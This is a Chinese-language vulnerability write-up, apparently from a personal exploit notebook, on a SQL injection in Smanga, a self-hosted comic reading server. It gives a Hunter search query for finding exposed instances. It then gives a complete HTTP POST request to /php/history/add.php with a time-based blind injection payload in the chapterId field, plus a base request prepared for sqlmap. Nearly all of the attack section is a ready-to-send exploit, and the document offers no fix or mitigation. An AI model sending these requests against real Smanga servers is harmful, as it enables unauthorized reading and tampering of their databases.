# Smanga mediaId存在SQL注入漏洞

# 一、漏洞简介
Smanga无需配置，docker直装的漫画流媒体阅读工具。以emby plex为灵感，为解决漫画阅读需求而开发的漫画阅读器。Smanga mediaId存在SQL注入漏洞.

# 二、影响版本
+ Smanga

# 三、资产测绘
+ hunter`web.title=="smanga"`
+ 特征

![1704896644693-d87321ff-18ab-47ce-a047-0b7cbeb372e0.png](./img/B-CxjmEk9QXAmBoF/1704896644693-d87321ff-18ab-47ce-a047-0b7cbeb372e0-400765.png)

# 四、漏洞复现
```java
POST /php/history/add.php HTTP/1.1
Host: 
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ak;q=0.8
Cookie: thinkphp_show_page_trace=0|0
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 196

chapterCover=1&chapterId=1' AND (SELECT 6064 FROM (SELECT(SLEEP(5)))bcUs) AND 'IwYx'='IwYx&chapterName=1&chatpterPath=1&chaptertype=image&keyword=1&mangaCover=undefined&mangaId=1&mangaName=&mediaId=1&timestamp=12123123&userId=1
```

![1704897270150-b9afaf47-d6ee-43ba-a9bb-6acd85c5a8f7.png](./img/B-CxjmEk9QXAmBoF/1704897270150-b9afaf47-d6ee-43ba-a9bb-6acd85c5a8f7-394159.png)

sqlmap

```java
POST /php/history/add.php HTTP/1.1
Host: 
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ak;q=0.8
Cookie: thinkphp_show_page_trace=0|0
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 196

chapterCover=1&chapterId=1&chapterName=1&chatpterPath=1&chaptertype=image&keyword=1&mangaCover=undefined&mangaId=1&mangaName=&mediaId=1&timestamp=12123123&userId=1
```

![1704897297677-8ec32e97-be60-4261-aacb-709fb1457a99.png](./img/B-CxjmEk9QXAmBoF/1704897297677-8ec32e97-be60-4261-aacb-709fb1457a99-346321.png)



> 更新: 2024-02-29 23:55:42  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ip5new4ve7mtypcf>